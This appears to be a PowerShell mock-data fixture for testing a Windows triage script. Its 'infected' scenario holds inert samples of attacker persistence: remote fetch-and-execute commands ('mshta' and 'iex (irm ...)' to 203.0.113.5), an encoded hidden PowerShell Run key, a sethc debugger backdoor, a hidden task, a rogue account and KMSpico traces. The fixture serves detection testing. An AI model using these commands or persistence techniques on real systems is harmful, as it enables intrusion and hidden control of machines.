# Jeu de données factice pour tester Invoke-WinTriage.ps1 sans toucher au système réel.
# Chargé par -TestHooks ; le scénario vient de $env:WINTRIAGE_SCENARIO (clean | infected).
$Scenario = $env:WINTRIAGE_SCENARIO
$Bad = ($Scenario -eq 'infected')
$U = 'Registry::HKEY_USERS\S-1-5-21-1'
$NT = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'

$script:MockReg = @{
    "$NT\Winlogon"                                              = @{ Shell = 'explorer.exe'; Userinit = 'C:\Windows\system32\userinit.exe,' }
    'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'       = @{ SecurityHealth = 'C:\Windows\System32\SecurityHealthSystray.exe'; Contoso = '"C:\Program Files\Contoso\agent.exe" /tray' }
    'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'                = @{ 'Authentication Packages' = @('msv1_0'); 'Notification Packages' = @('scecli'); 'Security Packages' = @('""') }
    'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager'    = @{ BootExecute = @('autocheck autochk *') }
    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Contoso Update' = @{ Id = '{11111111-1111-1111-1111-111111111111}'; SD = [byte[]](1, 2) }
}
# Cas légitimes qui ne doivent PAS déclencher d'alerte (non-régression des faux positifs)
$script:MockReg["$U\Software\Microsoft\Office\16.0\Word\Security\Trusted Locations\Location0"] = @{ Path = '%APPDATA%\Microsoft\Templates\' }
$script:MockReg["$U\Software\Microsoft\Office\16.0\Word\Security"] = @{ VBAWarnings = 2 }
if ($Bad) {
    $script:MockReg["$NT\Winlogon"].Userinit = 'C:\Windows\system32\userinit.exe,C:\Users\Public\evil.exe'
    $script:MockReg["$U\Software\Microsoft\Windows\CurrentVersion\Run"] = @{ Updater = 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=' ; Helper = 'C:\Users\alice\AppData\Roaming\unsigned_helper.exe' }
    $script:MockReg["$U\Software\Microsoft\Office\16.0\Common\Licensing\Resiliency"] = @{ TimeOfLastHeartbeatFailure = '2040-01-01T00:00:00Z' }
    $script:MockReg["$U\Software\Microsoft\Office\16.0\Word\Security"] = @{ VBAWarnings = 1 }
    $script:MockReg["$NT\SoftwareProtectionPlatform"] = @{ KeyManagementServiceName = '10.0.0.10'; KeyManagementServicePort = '1688' }
    $script:MockReg["$NT\Image File Execution Options\sethc.exe"] = @{ Debugger = 'C:\Windows\System32\cmd.exe' }
    $script:MockReg["$NT\Schedule\TaskCache\Tree\SysMon"] = @{ Id = '{22222222-2222-2222-2222-222222222222}' }                      # sans SD : tâche masquée
    $script:MockReg["$NT\Schedule\TaskCache\Tasks\{22222222-2222-2222-2222-222222222222}"] = @{ Actions = [Text.Encoding]::Unicode.GetBytes('cmd.exe /c C:\Users\alice\.config\smt.cmd') }
    $script:MockReg["$NT\Schedule\TaskCache\Tree\Activation-Renewal"] = @{ Id = '{33333333-3333-3333-3333-333333333333}'; SD = [byte[]](1) }  # invisible de l'API
}
function Get-RegValues([string]$Path) { foreach ($k in $script:MockReg.Keys) { if ($k -eq $Path) { return $script:MockReg[$k] } }; return $null }
function Get-RegSubKeys([string]$Path) {
    $p = $Path.TrimEnd('\') + '\'
    @($script:MockReg.Keys | Where-Object { $_.Length -gt $p.Length -and $_.Substring(0, $p.Length) -eq $p } | ForEach-Object { ($_.Substring($p.Length) -split '\\')[0] } | Select-Object -Unique)
}
function Test-IsAdmin { $true }
function Get-HostInfo { [pscustomobject]@{ Computer = 'PC-TEST'; User = 'TEST\alice'; OS = 'Windows 11 (factice)'; InstallDate = (Get-Date).AddYears(-1); LastBoot = (Get-Date).AddDays(-2); PartOfDomain = $false; Domain = 'WORKGROUP'; PSVersion = "$($PSVersionTable.PSVersion)" } }
function Get-UserContexts { @([pscustomobject]@{ Name = 'alice'; Sid = 'S-1-5-21-1'; Profile = $env:USERPROFILE; RegRoot = $U }) }
function Get-Sig([string]$Path) {
    $signed = ($Path -notmatch '(?i)unsigned|evil|ohook|sppc\.dll')
    [pscustomobject]@{ Exists = ($Path -notmatch 'missing'); Signed = $signed; Microsoft = ($signed -and $Path -match '(?i)[\\/]Windows[\\/]|Microsoft|^(powershell|cmd)'); Signer = $(if ($signed) { 'Contoso Ltd' } else { '' }); Status = $(if ($signed) { 'Signé' } else { 'Non signé' }) }
}
function Get-TasksData {
    $t = @([pscustomobject]@{ Path = '\'; Name = 'Contoso Update'; Actions = @('"C:\Program Files\Contoso\update.exe" /silent'); Author = 'Contoso'; Date = '2026-01-10'; User = 'SYSTEM'; State = 'Ready' },
           [pscustomobject]@{ Path = '\Microsoft\Windows\Defrag\'; Name = 'ScheduledDefrag'; Actions = @('C:\Windows\System32\defrag.exe -c'); Author = 'Microsoft'; Date = ''; User = 'SYSTEM'; State = 'Ready' },
           [pscustomobject]@{ Path = '\Microsoft\Windows\Maintenance\'; Name = 'Entretien'; Actions = @('cmd.exe /c C:\Windows\System32\maint.cmd', 'COM:{11111111-2222-3333-4444-555555555555}'); Author = 'Microsoft'; Date = ''; User = 'SYSTEM'; State = 'Ready' })
    if ($Bad) { $t += [pscustomobject]@{ Path = '\'; Name = 'OneDrive Sync Helper'; Actions = @('mshta.exe http://203.0.113.5/a.hta'); Author = 'alice'; Date = (Get-Date).AddDays(-2).ToString('s'); User = 'alice'; State = 'Ready' } }
    $t
}
function Get-ServicesData {
    $s = @([pscustomobject]@{ Name = 'ContosoAgent'; DisplayName = 'Contoso Agent'; PathName = '"C:\Program Files\Contoso\agent.exe"'; StartMode = 'Auto'; State = 'Running'; StartName = 'LocalSystem' },
           [pscustomobject]@{ Name = 'Dnscache'; DisplayName = 'Client DNS'; PathName = 'C:\Windows\system32\svchost.exe -k NetworkService'; StartMode = 'Auto'; State = 'Running'; StartName = 'NT AUTHORITY\NetworkService' })
    if ($Bad) {
        $s += [pscustomobject]@{ Name = 'KMSELDI'; DisplayName = 'Service KMSELDI'; PathName = 'C:\Program Files\KMSpico\Service_KMS.exe'; StartMode = 'Auto'; State = 'Running'; StartName = 'LocalSystem' }
        $s += [pscustomobject]@{ Name = 'AnyDesk'; DisplayName = 'AnyDesk Service'; PathName = '"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --service'; StartMode = 'Auto'; State = 'Running'; StartName = 'LocalSystem' }
    }
    $s
}
function Get-ProcessesData {
    $p = @([pscustomobject]@{ ProcessId = 4321; ParentProcessId = 700; Name = 'agent.exe'; ExecutablePath = 'C:\Program Files\Contoso\agent.exe'; CommandLine = '"C:\Program Files\Contoso\agent.exe"' },
           [pscustomobject]@{ ProcessId = 900; ParentProcessId = 700; Name = 'svchost.exe'; ExecutablePath = 'C:\Windows\System32\svchost.exe'; CommandLine = 'C:\Windows\System32\svchost.exe -k netsvcs' })
    if ($Bad) { $p += [pscustomobject]@{ ProcessId = 6666; ParentProcessId = 4; Name = 'svchost.exe'; ExecutablePath = 'C:\Users\Public\svchost.exe'; CommandLine = 'C:\Users\Public\svchost.exe' } }
    $p
}
function Get-ListeningPorts { @([pscustomobject]@{ LocalAddress = '0.0.0.0'; LocalPort = 8443; OwningProcess = 4321 }) }
function Get-WmiSubscriptions {
    $w = @([pscustomobject]@{ Class = 'NTEventLogEventConsumer'; Name = 'SCM Event Log Consumer'; Detail = '' }, [pscustomobject]@{ Class = '__EventFilter'; Name = 'SCM Event Log Filter'; Detail = 'select * from MSFT_SCMEventLogEvent' })
    if ($Bad) { $w += [pscustomobject]@{ Class = 'CommandLineEventConsumer'; Name = 'Updater'; Detail = 'powershell.exe -nop -c "iex (irm http://203.0.113.5/s)"' } }
    $w
}
function Get-LicensingProducts {
    if ($Bad) { @([pscustomobject]@{ Name = 'Windows(R), Professional edition'; Description = 'Windows(R) Operating System, VOLUME_KMSCLIENT channel'; LicenseStatus = 1; GracePeriodRemaining = 6000000; PartialProductKey = 'T83GX'; KeyManagementServiceMachine = ''; DiscoveredKeyManagementServiceMachineName = '' }) }
    else { @([pscustomobject]@{ Name = 'Windows(R), Professional edition'; Description = 'Windows(R) Operating System, OEM_DM channel'; LicenseStatus = 1; GracePeriodRemaining = 0; PartialProductKey = 'ABCDE'; KeyManagementServiceMachine = ''; DiscoveredKeyManagementServiceMachineName = '' }) }
}
function Get-DefenderData {
    $prefs = [pscustomobject]@{ ExclusionPath = @(); ExclusionProcess = @(); ExclusionExtension = @() }
    $det = @(); $thr = @()
    if ($Bad) {
        $prefs.ExclusionPath = @('C:\Users\alice\AppData', 'C:\Tools\build')
        $det = @([pscustomobject]@{ ThreatID = 42; InitialDetectionTime = (Get-Date).AddDays(-3); Resources = @('file:_C:\Users\alice\Downloads\KMSpico.exe'); ProcessName = 'explorer.exe'; ActionSuccess = $true })
        $thr = @([pscustomobject]@{ ThreatID = 42; ThreatName = 'HackTool:Win32/AutoKMS' })
    }
    [pscustomobject]@{ Status = [pscustomobject]@{ AntivirusEnabled = $true; RealTimeProtectionEnabled = (-not $Bad); IsTamperProtected = $true; AntivirusSignatureLastUpdated = (Get-Date) }
                       Prefs = $prefs; Detections = $det; Threats = $thr; OtherAV = @('Windows Defender') }
}
function Get-EventData([string]$Log, [int[]]$Ids, [datetime]$Start, [string]$Provider) {
    if (-not $Bad) { return @() }
    if ($Log -eq 'Security' -and $Ids -contains 1102) { return @([pscustomobject]@{ Time = (Get-Date).AddDays(-1); Id = 1102; Message = 'Le journal d''audit a été effacé.'; Props = @() }) }
    if ($Log -eq 'System' -and $Ids -contains 7045) { return @([pscustomobject]@{ Time = (Get-Date).AddDays(-1); Id = 7045; Message = ''; Props = @('WinUpd', 'C:\Users\Public\unsigned_svc.exe', 'user mode service', 'auto start', 'LocalSystem') }) }
    @()
}
function Get-LocalUsersData { $a = @([pscustomobject]@{ Name = 'alice'; Enabled = $true; SID = 'S-1-5-21-1-1001'; LastLogon = (Get-Date); PasswordLastSet = (Get-Date).AddMonths(-3) }); if ($Bad) { $a += [pscustomobject]@{ Name = 'support$'; Enabled = $true; SID = 'S-1-5-21-1-1002'; LastLogon = $null; PasswordLastSet = (Get-Date).AddDays(-1) } }; $a }
function Get-LocalAdmins { @('PC-TEST\alice') }
function Resolve-Lnk([string]$Path) { 'C:\Program Files\Contoso\agent.exe /startup' }
function Get-BitsJobs { if ($Bad) { @([pscustomobject]@{ Name = 'upd'; NotifyCmd = 'C:\Users\Public\evil.exe'; Urls = @('http://203.0.113.5/p') }) } else { @() } }

# Racines du système redirigées vers le bac à sable créé par Run-SelfTest.ps1
$SB = $env:WINTRIAGE_SANDBOX
$SysRoot = Join-Path $SB 'Windows'; $PF = Join-Path $SB 'Program Files'; $PF86 = Join-Path $SB 'Program Files (x86)'
$PData = Join-Path $SB 'ProgramData'; $PublicDir = Join-Path $SB 'Users\Public'; $CommonPF = Join-Path $PF 'Common Files'; $CommonPF86 = Join-Path $PF86 'Common Files'
